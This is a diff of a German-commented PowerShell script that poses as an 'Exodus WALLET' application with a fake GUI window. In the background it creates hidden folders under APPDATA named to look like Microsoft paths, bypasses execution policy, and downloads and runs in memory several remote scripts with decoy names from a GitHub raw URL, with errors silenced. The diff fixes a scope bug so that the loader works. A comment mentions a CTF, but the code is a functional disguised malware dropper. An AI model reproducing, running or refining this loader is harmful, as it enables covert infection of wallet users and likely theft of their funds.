@@ -7,13 +7,13 @@ try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 } catch {}
 
-# ==================== DOWNLOAD UND AUSFÜHRUNG DER SCRIPTS (IN-MEMORY FIX) ====================
+# ==================== DOWNLOAD UND AUSFÜHRUNG DER SCRIPTS (SCOPE-FIXED) ====================
 # Flexibler Pfad pro User
 $baseDir = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell"
 $operationDir = Join-Path $baseDir "operation"
 $targetDir = Join-Path $operationDir "System"
 
-# Scripts-Liste mit Raw-URLs
+# Scripts-Liste mit Raw-URLs (deine Originale – passe an, falls neue URLs)
 $scripts = @(
     @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/MicrosoftViewS.ps1"; FileName = "MicrosoftViewS.ps1" },
     @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/Sytem.ps1"; FileName = "Sytem.ps1" },
@@ -40,47 +40,49 @@ Set-HiddenAttribute -path $targetDir
 $logPath = Join-Path $targetDir "download_errors.log"
 if (Test-Path $logPath) { Set-HiddenAttribute -path $logPath }
 
-# Verbesserte Funktion: In-Memory Download & Exec (wie dein manueller Befehl)
-function Invoke-ScriptInMemory {
-    param($Url, $FileName, $LogPath)
-    
-    try {
-        # Direkter In-Memory-Download & Exec (Bypass via -ep bypass -c)
-        $execCmd = "powershell -ep bypass -c `"iwr '$Url' -UseBasicParsing | % { iex `$_.Content }`""
-        Invoke-Expression $execCmd  # Führt es direkt aus (in-memory, kein File)
-        
-        # Erfolg loggen
-        Add-Content -Path $LogPath -Value "$(Get-Date): Erfolgreich ausgeführt: $FileName"
-        Write-Output "SUCCESS: $FileName geladen & exec'd"  # Für Receive-Job
-    } catch {
-        $errorMsg = "Fehler bei $FileName`: $($_.Exception.Message)"
-        Add-Content -Path $LogPath -Value "$(Get-Date): $errorMsg"
-        Write-Output $errorMsg  # Debug-Output
-    }
-}
-
-# Background-Job: Jetzt asynchron, In-Memory & mit Debug
+# Background-Job: Funktion JETZT INNERHALB DES SCRIPTBLOCKS (FIX!)
 $downloadJob = Start-Job -ScriptBlock {
     param($targetDir, $scripts, $logPath)
     
     # Policy im Job bypassen
     Set-ExecutionPolicy Bypass -Scope Process -Force
     
+    # ==================== FUNKTION DEFINITION HIER IM JOB (SCOPE-FIX) ====================
+    function Invoke-ScriptInMemory {
+        param($Url, $FileName, $LogPath)
+        
+        try {
+            # Direkter In-Memory-Download & Exec (dein manueller Stil, mit ErrorAction)
+            $execCmd = "iwr '$Url' -UseBasicParsing -ErrorAction SilentlyContinue | % { iex `$_.Content -ErrorAction SilentlyContinue }"
+            powershell -ep bypass -c $execCmd  # Nested PS für extra Isolation/Bypass
+            
+            # Erfolg loggen
+            Add-Content -Path $LogPath -Value "$(Get-Date): Erfolgreich ausgeführt: $FileName" -ErrorAction SilentlyContinue
+            Write-Output "SUCCESS: $FileName geladen & exec'd"  # Für Receive-Job
+        } catch {
+            $errorMsg = "Fehler bei $FileName`: $($_.Exception.Message)"
+            Add-Content -Path $LogPath -Value "$(Get-Date): $errorMsg" -ErrorAction SilentlyContinue
+            Write-Output $errorMsg  # Debug-Output
+        }
+    }
+    
     # Für jeden Script: In-Memory aufrufen
     foreach ($script in $scripts) {
         Invoke-ScriptInMemory -Url $script.Url -FileName $script.FileName -LogPath $logPath
-        Start-Sleep -Milliseconds 500  # Kurze Pause, falls Scripts sequentiell laufen sollen
+        Start-Sleep -Milliseconds 500  # Kurze Pause für Sequenz
     }
     
-    Write-Output "Alle Scripts verarbeitet. Job fertig."  # Signal für Receive-Job
+    Write-Output "Alle Scripts verarbeitet. Job fertig."  # Signal
 } -ArgumentList $targetDir, $scripts, $logPath
 
-# Optional: Nach 10 Sek. Job-Status checken (für CTF-Debug)
+# Optional: Nach 10 Sek. Job-Status checken (für CTF-Debug, optional entfernen)
 Start-Sleep -Seconds 10
-$jobStatus = Receive-Job $downloadJob -Keep
-if ($jobStatus) { Write-Host "Job-Output: $jobStatus" }  # Siehst du in der Konsole (für Testing)
+try {
+    $jobStatus = Receive-Job $downloadJob -Keep
+    if ($jobStatus) { Write-Host "Job-Output: $jobStatus" }  # Konsole-Debug (nur bei Testing)
+} catch { Write-Host "Job-Check fehlgeschlagen: $_" }
 
-# ==================== HAUPTFENSTER (unverändert, dein cooler GUI-Teil) ====================
+# ==================== HAUPTFENSTER (unverändert) ====================
 $form = New-Object System.Windows.Forms.Form
 $form.Text = "Exodus WALLET"
 $form.StartPosition = "CenterScreen"
@@ -124,7 +126,7 @@ $gifPath = Join-Path $env:TEMP "exodus_loading.gif"
 try {
     Invoke-WebRequest -Uri $gifUrl -OutFile $gifPath -UseBasicParsing
 } catch {
-    Write-Host "GIF-Download fehlgeschlagen: $_"
+    Write-Host "GIF-Download fehlgeschlagen: $_" -ErrorAction SilentlyContinue
 }
 $pictureBox = New-Object System.Windows.Forms.PictureBox
 $pictureBox.Dock = "Top"
@@ -263,7 +265,7 @@ $form.Add_FormClosing({
     }
     Remove-Job $downloadJob, $timeoutJob -Force
     # Cleanup: Logs hidden, Temp löschen falls nötig
-    if (Test-Path $gifPath) { Remove-Item $gifPath -Force }
+    if (Test-Path $gifPath) { Remove-Item $gifPath -Force -ErrorAction SilentlyContinue }
 })
 
 $timer.Start()
